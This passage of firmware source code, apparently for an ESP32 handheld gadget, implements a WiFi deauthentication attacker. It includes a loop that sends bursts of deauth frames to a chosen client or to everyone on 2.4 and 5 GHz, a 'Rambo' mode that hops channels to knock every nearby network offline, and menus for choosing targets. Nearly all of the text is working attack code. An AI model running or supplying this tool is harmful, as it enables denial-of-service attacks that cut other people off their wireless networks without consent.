                // 2.4 GHz — Send a burst of 3 frames for reliable kick

                for (int b = 0; b < 3; b++) {

                    sendDeauth(targetMac, activeAP.bssid);

                    if (!broadcastMode) {

                        sendDeauth(activeAP.bssid, targetMac);

                    }

                    delayMicroseconds(200);

                }

            } else {

                // 5 GHz — route through C5 co-processor

                c5SendDeauth(activeAP.bssid, targetMac, 0x0007);

                if (!broadcastMode) {

                    c5SendDeauth(activeAP.bssid, activeAP.bssid, 0x0007);

                }

            }

        }



        // ── Channel hop each 500ms in Rambo ────────────────────────────

        if (ramboMode && dynamicRamboChannelCount > 0 && millis() - lastChannelHop > 500) {

            ramboIdx = (ramboIdx + 1) % dynamicRamboChannelCount;

            uint8_t nextCh = dynamicRamboChannels[ramboIdx];

            if (is5GHzChannel(nextCh)) {

                c5SetChannel(nextCh);

            } else {

                esp_wifi_set_channel(nextCh, WIFI_SECOND_CHAN_NONE);

            }

            lastChannelHop = millis();

        }



        // ── Update UI each 250 ms ──────────────────────────────────────

        if (millis() - lastStatsUpdate > 250) {

            unsigned long now   = millis();

            unsigned long delta = deauthPackets - lastPktCount;

            unsigned long dt    = now - lastStatsUpdate;

            rate = (delta * 1000.0f) / dt;

            lastPktCount    = deauthPackets;

            lastStatsUpdate = now;



            drawAttackStats(now - startMs, deauthPackets, rate);

        }



        // ── Detectar OK HOLD ───────────────────────────────────────────

        if (navEnterPressed()) {

            if (!okHeld) {

                okPressStart = millis();

                okHeld = true;

            } else if (millis() - okPressStart > 500) {

                stopAttack = true;

            }

        } else {

            okHeld = false;

        }



        yield();

        delay(15);

    }



    // ── Cleanup ─────────────────────────────────────────────────────────

    esp_wifi_set_promiscuous(false);

    WiFi.mode(WIFI_STA);

    WiFi.disconnect();

    delay(50);



    beep(1800, 40); delay(20);

    beep(1200, 60);



    while (navEnterPressed() || navBackPressed()) delay(5);

    delay(150);

}



// ═══════════════════════════════════════════════════════════════════════════

// MAIN

// ═══════════════════════════════════════════════════════════════════════════

void runDeauther() {

    while (navEnterPressed() || navBackPressed()) delay(5);

    delay(100);



    if (!showDisclaimer()) return;



    while (true) {

        if (apCount == 0) scanAPs();



        if (apCount == 0) {

            tft.fillScreen(TFT_BLACK);

            tft.drawRect(0, 0, 320, 240, UI_MAIN);

            drawStringBig(35, 90, "NO APs FOUND", TFT_RED, 1);

            drawStringCustom(30, 130, "No WiFi networks detected.", UI_MAIN, 1);

            drawStringCustom(30, 175, "OK: rescan  BACK/UP/DN: exit", UI_ACCENT, 1);



            while (true) {

                if (navEnterPressed()) {

                    beep(2000, 40);

                    while (navEnterPressed() || navBackPressed()) delay(5);

                    break;

                }

                if (navBackPressed() || navUpPressed() || navDownPressed()) {

                    beep(1000, 60);

                    while (navBackPressed() || navUpPressed() || navDownPressed()) delay(5);

                    return;

                }

                delay(20);

            }

            continue;

        }



        int apChoice = selectAP();



        if (apChoice == -3) break;          // BACK

        if (apChoice == -2) {               // RESCAN

            apCount = 0;

            continue;

        }



        if (apChoice == -1) {               // RAMBO

            if (!confirmRambo()) continue;

            ramboMode = true;

            broadcastMode = true;

            runAttackLoop();

            ramboMode = false;

            continue;

        }



        // AP específico seleccionado

        activeAP = aps[apChoice];

        ramboMode = false;



        // Select action: broadcast vs scan clients

        int action = selectAction(activeAP);

        if (action == -1) continue;



        if (action == 0) {

            broadcastMode = true;

            runAttackLoop();

            continue;

        }



        // action == 1 → SCAN CLIENTS

        scanClients(activeAP);



        if (clientCount == 0) {

            tft.fillScreen(TFT_BLACK);

            tft.drawRect(0, 0, 320, 240, UI_MAIN);

            drawStringBig(30, 90, "NO CLIENTS FOUND", TFT_RED, 1);

            drawStringCustom(30, 130, "No active clients detected.", UI_MAIN, 1);

            drawStringCustom(30, 145, "You can still broadcast.", UI_ACCENT, 1);

            drawStringCustom(30, 175, "OK/BACK: continue", UI_ACCENT, 1);



            while (!navEnterPressed() && !navBackPressed()) delay(20);

            while (navEnterPressed() || navBackPressed()) delay(5);

            continue;

        }



        // Select target (client or ALL)

        while (true) {

            int target = selectTarget();



            if (target == -3) break;

            if (target == -2) {

                scanClients(activeAP);

                if (clientCount == 0) break;

                continue;

            }



            if (target == -1) {

                broadcastMode = true;

            } else {

                broadcastMode = false;

                memcpy(activeTargetMac, clients[target].mac, 6);

            }



            runAttackLoop();

        }

    }

}

